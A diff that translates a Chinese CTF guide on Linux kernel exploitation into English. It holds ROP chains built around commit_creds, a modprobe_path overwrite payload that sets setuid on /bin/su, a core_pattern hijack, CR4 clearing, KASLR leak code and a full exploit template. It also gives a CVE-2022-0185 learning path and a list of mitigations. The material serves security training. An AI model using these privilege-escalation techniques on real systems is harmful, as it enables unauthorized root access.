@@ -1,44 +1,44 @@
-# 内核 Pwn (Kernel Pwn)
+# Kernel Pwn
 
-## 准备环境
+## Setting Up the Environment
 
-典型内核题包：
+A typical kernel challenge package:
 
 ```text
 kernel/
-├── bzImage          # 压缩内核镜像
-├── vmlinux          # 未压缩内核（带符号，用于 gdb）
+├── bzImage          # compressed kernel image
+├── vmlinux          # uncompressed kernel (with symbols, for gdb)
 ├── initramfs.cpio.gz / rootfs.img
-├── vuln.ko          # 漏洞驱动
-├── run.sh           # qemu 启动脚本
-└── (.config)        # 编译配置，可选
+├── vuln.ko          # vulnerable driver
+├── run.sh           # qemu launch script
+└── (.config)        # build configuration, optional
 ```
 
-### 拆 initramfs 改 init 脚本
+### Unpacking initramfs and Modifying the init Script
 
 ```bash
 mkdir initramfs && cd initramfs
 zcat ../initramfs.cpio.gz | cpio -idm
-# 或 newc 格式：
+# or, for the newc format:
 # cpio -idm < ../initramfs.cpio
 
-# 改 init 拿 root（CTF 学习用，真实题目通常 setuid 1000）
+# Modify init to get root (for CTF practice; real challenges usually setuid 1000)
 sed -i 's|setuidgid 1000|setuidgid 0|g' init
-# 或注释掉 user 切换那一行
+# or comment out the user-switching line
 
-# 重新打包
+# Repack
 find . | cpio -o --format=newc | gzip > ../initramfs.cpio.gz
 cd ..
 ```
 
-### 提取 vmlinux（如果只给了 bzImage）
+### Extracting vmlinux (if only bzImage is provided)
 
 ```bash
-# 用 extract-vmlinux 脚本（kernel 源码 scripts/）
+# Use the extract-vmlinux script (kernel source scripts/)
 /usr/src/linux/scripts/extract-vmlinux ./bzImage > vmlinux
 ```
 
-### QEMU 启动参数模板
+### QEMU Launch Parameter Template
 
 ```bash
 #!/bin/sh
@@ -51,107 +51,107 @@ qemu-system-x86_64 \
     -monitor /dev/null \
     -nographic \
     -no-reboot \
-    -s    # 开 gdb 端口 1234
+    -s    # opens gdb port 1234
 ```
 
-关键参数对应的保护：
+Protections corresponding to key parameters:
 
-| 参数 | 含义 | 影响利用 |
+| Parameter | Meaning | Impact on Exploitation |
 |------|------|---------|
-| `+smep` | 内核态不能执行用户态代码 | 必须用 ROP，不能跳到用户态 shellcode |
-| `+smap` | 内核态不能访问用户态数据 | rop 链不能放用户态，要放内核态（堆喷 / msgsnd） |
-| `+pku` | Protection Keys | 类似 SMAP |
-| `nokaslr` | 禁用 KASLR | 函数地址固定 |
-| `kaslr` | 启用 KASLR | 必须 leak |
-| `pti=on` | KPTI（Meltdown 修复） | 用户态返回需要 swapgs_restore_regs_and_return_to_usermode |
+| `+smep` | Kernel mode cannot execute user-mode code | Must use ROP; cannot jump to user-mode shellcode |
+| `+smap` | Kernel mode cannot access user-mode data | The ROP chain cannot live in user mode; put it in kernel mode (heap spray / msgsnd) |
+| `+pku` | Protection Keys | Similar to SMAP |
+| `nokaslr` | Disables KASLR | Function addresses are fixed |
+| `kaslr` | Enables KASLR | Must leak |
+| `pti=on` | KPTI (Meltdown mitigation) | Returning to user mode requires swapgs_restore_regs_and_return_to_usermode |
 
-### 调试
+### Debugging
 
 ```bash
-# 终端 1
-./run.sh   # 带 -s
+# Terminal 1
+./run.sh   # with -s
 
-# 终端 2
+# Terminal 2
 gdb vmlinux
 (gdb) target remote :1234
 (gdb) b vulnerable_ioctl
 (gdb) c
 ```
 
-GEF 推荐用 bata24 维护的 fork，对内核结构体有专门 pretty-print。
+For GEF, the bata24-maintained fork is recommended; it has dedicated pretty-printers for kernel structs.
 
-## 漏洞类型分流
+## Vulnerability Type Triage
 
-| 漏洞 | 典型来源 | 利用基线 |
+| Vulnerability | Typical Origin | Exploitation Baseline |
 |------|---------|---------|
-| 内核栈溢出 | copy_from_user 长度可控 | 栈金丝雀 + KASLR → ROP |
-| 内核堆溢出 | kmalloc slab 越界写 | slab 喷射 + 覆盖相邻对象 |
-| UAF | refcount 错误 / 双 free | 重新申请同 slab → 控制释放对象 |
-| 整数溢出 | size 计算溢出 → 小分配大拷贝 | 实际是溢出，同上 |
-| TOCTOU | 用户态指针二次解引用 | userfaultfd / FUSE 拖时间 |
-| race | 双线程同时 ioctl | 卡时序窗口 |
-| 任意读写 | 已经是终极原语 | 直接改 cred / modprobe_path |
+| Kernel stack overflow | copy_from_user with controllable length | Stack canary + KASLR → ROP |
+| Kernel heap overflow | kmalloc slab out-of-bounds write | Slab spray + overwrite adjacent object |
+| UAF | refcount bug / double free | Re-allocate the same slab → control the freed object |
+| Integer overflow | size calculation overflow → small allocation, large copy | Effectively an overflow, same as above |
+| TOCTOU | user-space pointer dereferenced twice | userfaultfd / FUSE to stall time |
+| race | two threads issuing ioctl simultaneously | Nail the timing window |
+| Arbitrary read/write | already the ultimate primitive | Directly modify cred / modprobe_path |
 
-## slab 喷射（堆 pwn 核心）
+## Slab Spraying (Core of Kernel Heap Pwn)
 
-把可控大小的内核对象喷到漏洞 slab，覆盖目标对象。
+Spray kernel objects of controllable size into the vulnerable slab to overwrite the target object.
 
-| slab size | 喷射对象 | 优点 |
+| Slab Size | Spray Object | Advantages |
 |-----------|---------|------|
-| kmalloc-64 / 96 | `seq_operations` | 有函数指针，覆盖即控 IP |
-| kmalloc-1024 | `tty_struct` | 有 ops 指针，结构精美 |
-| kmalloc-4096 | `pipe_buffer` | 现代版主力，6.x 仍有效 |
-| 任意 size | `msg_msg` | 大小可控（8 - 4096+），sysv msgsnd 控数据 |
-| kmalloc-128 | `user_key_payload` | keyctl 系列接口 |
+| kmalloc-64 / 96 | `seq_operations` | Has function pointers; overwriting one gives IP control |
+| kmalloc-1024 | `tty_struct` | Has an ops pointer; beautifully structured |
+| kmalloc-4096 | `pipe_buffer` | The mainstay of the modern era, still works on 6.x |
+| Any size | `msg_msg` | Controllable size (8 - 4096+), sysv msgsnd controls the data |
+| kmalloc-128 | `user_key_payload` | keyctl family of interfaces |
 
-### msg_msg 喷射示例
+### msg_msg Spray Example
 
 ```c
-// 用户态触发
+// Triggered from user mode
 int msqid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
 
 struct {
     long mtype;
-    char mtext[0x80 - 0x30];  // 加上 msg_msg 头 0x30 = kmalloc-128
+    char mtext[0x80 - 0x30];  // plus the 0x30 msg_msg header = kmalloc-128
 } msg = { .mtype = 0x1337 };
 memset(msg.mtext, 'A', sizeof(msg.mtext));
 
-msgsnd(msqid, &msg, sizeof(msg.mtext), 0);   // 喷到 kmalloc-128
-// ... 触发漏洞覆盖
-msgrcv(msqid, &msg, sizeof(msg.mtext), 0, 0); // 读回看是不是被改了 → leak
+msgsnd(msqid, &msg, sizeof(msg.mtext), 0);   // spray into kmalloc-128
+// ... trigger the vulnerability to overwrite
+msgrcv(msqid, &msg, sizeof(msg.mtext), 0, 0); // read back to see if it was modified → leak
 ```
 
-## 提权路径
+## Privilege Escalation Paths
 
 ### 1. commit_creds(prepare_kernel_cred(0)) ROP
 
-经典且通用。前提：能控 RIP（栈溢出 / vtable 劫持）。
+Classic and universal. Precondition: RIP control (stack overflow / vtable hijack).
 
 ```c
-// 用户态 ROP 链
+// User-mode ROP chain
 uint64_t rop[] = {
     pop_rdi,                          // pop rdi; ret
     0,                                // arg: 0
-    prepare_kernel_cred,              // → 返回 root cred 到 rax
+    prepare_kernel_cred,              // → returns root cred in rax
     pop_rdi,                          // pop rdi; ret
-    /* 占位，下面 mov 会覆盖 */ 0,
-    /* mov rdi, rax; ... ; ret */ 0,  // 转 rax→rdi（部分需要专门 gadget）
-    commit_creds,                     // 设置当前进程 cred = root
-    swapgs_restore_regs_and_return_to_usermode + 22,  // 跳过 push 序列
-    0, 0,                             // rax, rdi 占位
-    user_rip,                         // 用户态返回函数（保存了 cs/ss）
+    /* placeholder, the mov below will overwrite it */ 0,
+    /* mov rdi, rax; ... ; ret */ 0,  // transfer rax→rdi (some builds need a dedicated gadget)
+    commit_creds,                     // set current process cred = root
+    swapgs_restore_regs_and_return_to_usermode + 22,  // skip the push sequence
+    0, 0,                             // rax, rdi placeholders
+    user_rip,                         // user-mode return function (saved cs/ss)
     user_cs, user_rflags, user_rsp, user_ss,
 };
 ```
 
-**关键 gadget**（要在 vmlinux 里 ROPgadget 找）:
+**Key gadgets** (find them in vmlinux with ROPgadget):
 
 ```bash
 ROPgadget --binary vmlinux --only "pop|ret" | grep 'pop rdi'
 ROPgadget --binary vmlinux --only "mov|ret" | grep 'mov rdi, rax'
 ```
 
-返回用户态前必须保存 cs/ss/rflags/rsp：
+Before returning to user mode you must save cs/ss/rflags/rsp:
 
 ```c
 void save_state() {
@@ -165,79 +165,79 @@ void save_state() {
 void shell() { system("/bin/sh"); }
 ```
 
-### 2. modprobe_path 改 /tmp/x（最省事）
+### 2. Change modprobe_path to /tmp/x (the easiest route)
 
 ```text
-原理：
-  - 内核全局变量 modprobe_path 默认 "/sbin/modprobe"
-  - 当 execve 一个不认识 magic 的文件时，内核调用 modprobe_path 以 root 执行
-  - 改成 "/tmp/x"，写 /tmp/x（chmod +x），触发未知 magic 执行
-  
-适用：有任意写原语，但不一定能 ROP
+Principle:
+  - The kernel global variable modprobe_path defaults to "/sbin/modprobe"
+  - When execve hits a file with an unrecognized magic, the kernel runs modprobe_path as root
+  - Change it to "/tmp/x", write /tmp/x (chmod +x), then trigger the unknown-magic execution
+
+Applicable when: you have an arbitrary write primitive but not necessarily ROP
 ```
 
 ```c
-// 1. 准备 payload
+// 1. Prepare the payload
 system("echo -e '#!/bin/sh\nchmod +s /bin/su' > /tmp/x");
 system("chmod +x /tmp/x");
 
-// 2. 准备触发文件
+// 2. Prepare the trigger file
 system("echo -e '\\xff\\xff\\xff\\xff' > /tmp/trigger");
 system("chmod +x /tmp/trigger");
 
-// 3. 漏洞写：把 modprobe_path 改成 "/tmp/x\x00"
+// 3. Vulnerability write: change modprobe_path to "/tmp/x\x00"
 arbitrary_write(modprobe_path_addr, "/tmp/x\x00");
 
-// 4. 触发
+// 4. Trigger
 system("/tmp/trigger");
-// 内核 root 跑 /tmp/x，做了 chmod +s /bin/su
+// The kernel runs /tmp/x as root, performing chmod +s /bin/su
 
-// 5. 利用 setuid
+// 5. Exploit setuid
 system("/bin/su");
 ```
 
-**modprobe_path 地址来源**：vmlinux 里符号，或 /proc/kallsyms（如果 kptr_restrict=0）。
+**Source of the modprobe_path address**: the symbol in vmlinux, or /proc/kallsyms (if kptr_restrict=0).
 
 ### 3. core_pattern hijack
 
 ```text
-类似思想：/proc/sys/kernel/core_pattern 控制 coredump 处理程序
-改成 "|/tmp/x %P"，让进程崩溃时调用
-缺点：需要触发 coredump，比 modprobe_path 笨重
+Similar idea: /proc/sys/kernel/core_pattern controls the coredump handler
+Change it to "|/tmp/x %P" so it gets invoked when a process crashes
+Downside: requires triggering a coredump; clunkier than modprobe_path
 ```
 
-### 4. 内核 ROP 关 SMEP/SMAP
+### 4. Kernel ROP to Disable SMEP/SMAP
 
-如果就是想跳回用户态 shellcode（学习目的），可以 ROP 关 cr4 的 bit:
+If you simply want to jump back to user-mode shellcode (for learning purposes), you can ROP-clear the cr4 bits:
 
 ```c
 // CR4: SMEP = bit 20, SMAP = bit 21
-// 关 SMEP+SMAP 后，jmp 到用户态 shellcode 才能跑
+// After clearing SMEP+SMAP, jmp to user-mode shellcode will work
 uint64_t rop[] = {
     pop_rdi,
-    0x6f0,                  // CR4 期望值（去掉 SMEP/SMAP 位）
-    mov_cr4_rdi,            // "mov cr4, rdi; pop rbp; ret" 之类
+    0x6f0,                  // desired CR4 value (SMEP/SMAP bits removed)
+    mov_cr4_rdi,            // something like "mov cr4, rdi; pop rbp; ret"
     0,
-    user_shellcode_addr,    // 跳过去（如果还没关 SMEP 这步会失败）
+    user_shellcode_addr,    // jump there (this step fails if SMEP is not yet off)
 };
 ```
 
-实际上**真实利用基本不走这条路** — 直接 commit_creds ROP 更短更稳。
+In practice, **real exploits basically never take this path** — the direct commit_creds ROP is shorter and more stable.
 
-## KASLR leak 渠道
+## KASLR Leak Channels
 
-| 来源 | 限制 | 备注 |
+| Source | Restriction | Notes |
 |------|------|------|
-| /proc/kallsyms | `kptr_restrict=0` 才有真地址 | CTF 常常开放 |
-| /sys/module/.../sections/.text | 同上 | 模块基址 |
-| dmesg | `dmesg_restrict=0` 才能读 | oops 信息泄漏地址 |
-| 内核栈未初始化读 | 漏洞本身要能任意读 | 残留地址 |
-| msg_msg + 漏洞 leak | 喷射后 OOB read | 通用 |
-| 旁路（Meltdown/Spectre） | KPTI 修了 Meltdown | 不通用 |
-| SIDT/SGDT 用户态指令 | 老内核可能漏 | 现代基本封了 |
+| /proc/kallsyms | real addresses only when `kptr_restrict=0` | Often open in CTFs |
+| /sys/module/.../sections/.text | same as above | Module base |
+| dmesg | readable only when `dmesg_restrict=0` | oops output leaks addresses |
+| Uninitialized kernel stack read | the vulnerability itself must allow arbitrary reads | Leftover addresses |
+| msg_msg + vulnerability leak | OOB read after spraying | Generic |
+| Side channels (Meltdown/Spectre) | KPTI fixed Meltdown | Not generic |
+| SIDT/SGDT user-mode instructions | old kernels may leak | Basically sealed off in modern kernels |
 
 ```c
-// 经典：从 /proc/kallsyms 读
+// Classic: read from /proc/kallsyms
 FILE *f = fopen("/proc/kallsyms", "r");
 char line[256];
 unsigned long commit_creds = 0;
@@ -247,13 +247,13 @@ while (fgets(line, sizeof(line), f)) {
         break;
     }
 }
-unsigned long kbase = commit_creds - 0xXXXXX;  // 偏移看 vmlinux
+unsigned long kbase = commit_creds - 0xXXXXX;  // offset per vmlinux
 ```
 
-## 完整 exploit 模板（用户态 + ioctl 触发 + ROP 提权 + shell）
+## Complete Exploit Template (user mode + ioctl trigger + ROP privilege escalation + shell)
 
 ```c
-// exploit.c — 内核 pwn 通用骨架
+// exploit.c — generic skeleton for kernel pwn
 #define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
@@ -285,7 +285,7 @@ static void win(void) {
     exit(0);
 }
 
-// === KASLR base（先 leak 或 nokaslr 时直接写死） ===
+// === KASLR base (leak first, or hardcode directly when nokaslr) ===
 #define KBASE_DEFAULT  0xffffffff81000000UL
 #define OFF_COMMIT_CREDS         0x0xxxxx
 #define OFF_PREPARE_KERNEL_CRED  0x0xxxxx
@@ -296,7 +296,7 @@ static void win(void) {
 int main(void) {
     save_state();
 
-    // 1. leak KASLR base（这里假设 /proc/kallsyms 可读，或自己写一个 leak primitive）
+    // 1. Leak KASLR base (assume /proc/kallsyms is readable here, or write your own leak primitive)
     unsigned long kbase = leak_kbase();
 
     unsigned long prepare_kernel_cred = kbase + OFF_PREPARE_KERNEL_CRED;
@@ -305,7 +305,7 @@ int main(void) {
     unsigned long mov_rdi_rax         = kbase + OFF_MOV_RDI_RAX;
     unsigned long swapgs_restore      = kbase + OFF_SWAPGS_RESTORE + 22;
 
-    // 2. 构造 ROP（在用户栈或在喷出来的 fake 栈上）
+    // 2. Build the ROP chain (on the user stack or on a sprayed fake stack)
     unsigned long *rop = mmap((void*)0x100000, 0x1000,
                               PROT_READ|PROT_WRITE,
                               MAP_PRIVATE|MAP_ANON|MAP_FIXED, -1, 0);
@@ -321,50 +321,50 @@ int main(void) {
     rop[i++] = (unsigned long)win;
     rop[i++] = user_cs;
     rop[i++] = user_rflags;
-    rop[i++] = (unsigned long)(rop + 100);  // 临时 user rsp，可指 mmap 高处
+    rop[i++] = (unsigned long)(rop + 100);  // temporary user rsp, can point high into the mmap
     rop[i++] = user_ss;
 
-    // 3. 触发漏洞，让内核 RIP 跳到 rop[0]
+    // 3. Trigger the vulnerability so kernel RIP jumps to rop[0]
     int fd = open("/dev/vuln", O_RDWR);
-    trigger(fd, rop);   // 题目相关：ioctl / write / read
+    trigger(fd, rop);   // challenge-specific: ioctl / write / read
 
     return 0;
 }
 ```
 
-## 学习参考：CVE-2022-0185
+## Learning Reference: CVE-2022-0185
 
 ```text
-漏洞：fs/fs_context.c 中 legacy_parse_param 长度计算有符号 / 无符号混淆
-      → kmalloc 堆缓冲区溢出，size 任意，data 任意
+Vulnerability: signed/unsigned confusion in the length calculation of legacy_parse_param in fs/fs_context.c
+              → kmalloc heap buffer overflow, arbitrary size, arbitrary data
 
-为什么是好的学习样本：
-1. 不需要 root 触发（unprivileged user namespace）
-2. 溢出大小完全可控
-3. 公开有完整 writeup + PoC
-4. 综合了：user_ns 利用、msg_msg 喷射、UAF 后重占用、跨缓存利用
+Why it is a good learning sample:
+1. No root needed to trigger (unprivileged user namespace)
+2. Overflow size fully controllable
+3. Public complete writeup + PoC
+4. Combines: user_ns exploitation, msg_msg spraying, UAF re-occupation, cross-cache exploitation
 
-学习路径：
-1. 编译带 CONFIG_USER_NS=y 的内核
-2. 跑 Crusaders of Rust 的原版 PoC：https://www.openwall.com/lists/oss-security/2022/01/18/7
-3. 看 willsroot.io 的官方 writeup（PortSwigger 收录的版本）
-4. 手动重写：把 msg_msg 喷射改成 pipe_buffer 喷射版本（练习不同 slab 路径）
-5. 加上 KASLR leak（原版用 /proc/kallsyms，挑战版禁用后改 OOB read）
+Learning path:
+1. Compile a kernel with CONFIG_USER_NS=y
+2. Run the Crusaders of Rust original PoC: https://www.openwall.com/lists/oss-security/2022/01/18/7
+3. Read willsroot.io's official writeup (the version carried by PortSwigger)
+4. Rewrite it manually: convert the msg_msg spray into a pipe_buffer spray version (practice a different slab path)
+5. Add a KASLR leak (the original uses /proc/kallsyms; the challenge version disables it, switch to an OOB read)
 ```
 
-主要技术点对应本文档的章节：
+Main technical points mapped to sections of this document:
 
-- 漏洞类型 → "内核堆溢出"
-- 喷射对象 → "msg_msg 喷射"
-- 提权方法 → "commit_creds ROP" 或 "modprobe_path"
-- KASLR leak → "/proc/kallsyms" 或 "msg_msg + 漏洞 leak"
+- Vulnerability type → "Kernel heap overflow"
+- Spray object → "msg_msg spray"
+- Privilege escalation method → "commit_creds ROP" or "modprobe_path"
+- KASLR leak → "/proc/kallsyms" or "msg_msg + vulnerability leak"
 
-## 注意事项
+## Caveats
 
-- **CONFIG_RANDOM_KSTACK_OFFSET / RANDOMIZE_KSTACK_OFFSET_DEFAULT** 让内核栈基址每次 syscall 都随机偏移 0-1023，影响所有依赖固定栈偏移的利用
-- **CONFIG_SLAB_FREELIST_RANDOM / HARDENED** 让 slab 内对象分配随机化，喷射成功率下降，要多喷
-- **CONFIG_STATIC_USERMODEHELPER** 把 modprobe_path 设为只读 `static_usermodehelper_path`，modprobe 攻击失效
-- **KPTI** 让用户态/内核态页表分离，返回用户态必须走 `swapgs_restore_regs_and_return_to_usermode` 这个 trampoline，不能直接 swapgs+iretq
-- **FG-KASLR**（function-granular KASLR）让函数级别随机化，需要 leak 多个符号反推每个函数偏移
-- **CET / IBT**（Intel 控制流强制）让间接跳转必须落在 ENDBR 指令，部分 gadget 失效
-- **不要在内核里调 printk 输出测试** — 串口 IO 会改变时序，破坏 race；用一个 magic 寄存器值（rcx=0xdeadbeef）+ gdb watch 来调试
+- **CONFIG_RANDOM_KSTACK_OFFSET / RANDOMIZE_KSTACK_OFFSET_DEFAULT** randomizes the kernel stack base offset by 0-1023 on every syscall, affecting all exploits that rely on fixed stack offsets
+- **CONFIG_SLAB_FREELIST_RANDOM / HARDENED** randomizes in-slab object allocation, lowering spray success rates — spray more
+- **CONFIG_STATIC_USERMODEHELPER** makes modprobe_path read-only via `static_usermodehelper_path`, defeating the modprobe attack
+- **KPTI** separates user/kernel page tables; returning to user mode must go through the `swapgs_restore_regs_and_return_to_usermode` trampoline — no direct swapgs+iretq
+- **FG-KASLR** (function-granular KASLR) randomizes at function granularity; you must leak multiple symbols to derive each function's offset
+- **CET / IBT** (Intel control-flow enforcement) requires indirect jumps to land on ENDBR instructions, invalidating some gadgets
+- **Do not call printk in the kernel for test output** — serial IO changes timing and breaks races; debug with a magic register value (rcx=0xdeadbeef) + a gdb watchpoint instead
